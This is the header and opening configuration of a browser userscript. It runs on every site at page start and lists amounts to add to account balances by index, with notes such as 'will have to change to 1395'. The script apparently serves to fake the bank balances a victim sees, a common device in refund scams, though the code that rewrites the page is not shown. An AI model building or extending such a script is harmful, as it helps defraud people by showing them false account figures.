// ==UserScript==
// @name         Ed Start 4Rec db.RolexManny@t-online.de
// @namespace    http://tampermonkey.net/
// @version      3.0
// @description  with minus bal handling
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/514696/Ed%20Start%204Rec%20dbRolexManny%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/514696/Ed%20Start%204Rec%20dbRolexManny%40t-onlinede.meta.js
// ==/UserScript==
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================


//         UBERSICHT
    // Specify the balances to adjust by index and the amount to adjust
    const accountBalanceAdjustments = [

        { index: 0, amount: 0 },
        { index: 1, amount: 0 },

  //       { index: 2, amount: 9700},  //3   // will have to change to 1395
        { index: 3, amount: 0 },  // 4  //will have to change to app 5700
   //    { index: 4, amount: 9700},  // 5
   //      { index: 5, amount: 9700}, //1
         { index: 6, amount:  0},
   //     { index: 7, amount: 9700}, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },

    ];

